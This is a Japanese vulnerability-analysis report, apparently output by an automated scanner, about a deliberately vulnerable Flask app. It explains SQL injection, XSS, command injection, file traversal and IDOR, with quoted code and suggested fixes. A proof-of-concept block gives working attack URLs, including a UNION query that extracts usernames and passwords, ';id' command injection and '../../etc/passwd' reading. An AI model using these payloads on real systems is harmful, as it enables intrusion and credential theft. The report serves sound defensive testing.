# 解析レポート

![中高信頼度](https://img.shields.io/badge/信頼度-中高-orange) **信頼度スコア: 80**

## 脆弱性タイプ

- `SQLI`
- `XSS`
- `RCE`
- `LFI`
- `IDOR`

## 解析結果

以下のコードには複数の重大な脆弱性が含まれています。

1. SQL Injection (/sqli)
   - ユーザー入力を直接SQLクエリに埋め込んでおり、`username`および`order`パラメータから任意のSQLを実行可能です。

2. Cross-Site Scripting (/xss)
   - `name`や`comment`をエスケープせずにHTML・属性・JavaScript・CSSコンテキストへ反映しており、任意のスクリプト/スタイル注入が可能です。

3. OS Command Injection (/cmdi)
   - `hostname`, `count`を組み込んだシステムコマンドを`os.popen`/`os.system`で実行しており、シェルインジェクションが可能です。

4. Local File Inclusion (/lfi)
   - `file`パラメータを検証せずに`open()`しており、任意のファイル読み出しが可能です。

5. IDOR (/logs)
   - `user_id`パラメータのチェックがなく、他ユーザーの監査ログを閲覧できます。

これらにより、データ漏洩から任意コード実行まで広範囲の攻撃が成立します。修正にはプリペアドステートメントや入力バリデーション、出力エスケープ、権限チェックの強化が必要です。

## PoC（概念実証コード）

```text
1) SQLi: http://<host>:5000/sqli?username=admin'%20UNION%20SELECT%201,username,password,1%20FROM%20users;--&order=id
2) XSS: http://<host>:5000/xss?name=<script>alert(1)</script>&comment=red
3) RCE: http://<host>:5000/cmdi?hostname=;id
4) LFI: http://<host>:5000/lfi?file=../../etc/passwd
5) IDOR: http://<host>:5000/logs?user_id=2
```

## 関連コードコンテキスト

### 関数名: sql_injection
- 理由: ユーザー入力を直接SQLに埋め込み（CWE-89）
- パス: repo/app.py
```rust
query1 = f"SELECT id, username, email, role FROM users WHERE username LIKE '%{username}%'"
```

### 関数名: xss
- 理由: HTMLコンテキストへエスケープなしで反映（CWE-79）
- パス: repo/app.py
```rust
<div>Hello, {name}!</div>
```

### 関数名: command_injection
- 理由: ユーザー入力をシェルコマンドに直接バインド（CWE-78）
- パス: repo/app.py
```rust
output1 = os.popen(f"ping -c {count} {hostname}").read()
```

### 関数名: local_file_inclusion
- 理由: パス検証なしのファイル読み込み（CWE-22）
- パス: repo/app.py
```rust
with open(file_path, 'r') as f:
```

### 関数名: view_logs
- 理由: 権限チェックなしで任意のuser_idを使用（IDOR）
- パス: repo/app.py
```rust
user_id = request.args.get('user_id', session.get('user', {}).get('id', 1))
```

## 解析ノート

エントリポイントは各ルート。パラメータ(username, order, name, comment, hostname, count, file, user_id)が全て直接利用され、バリデーションやエスケープ・権限チェックが皆無。影響範囲はDB操作、HTML出力、OSコマンド実行、ファイル読み取り、ログ閲覧まで多岐にわたる。

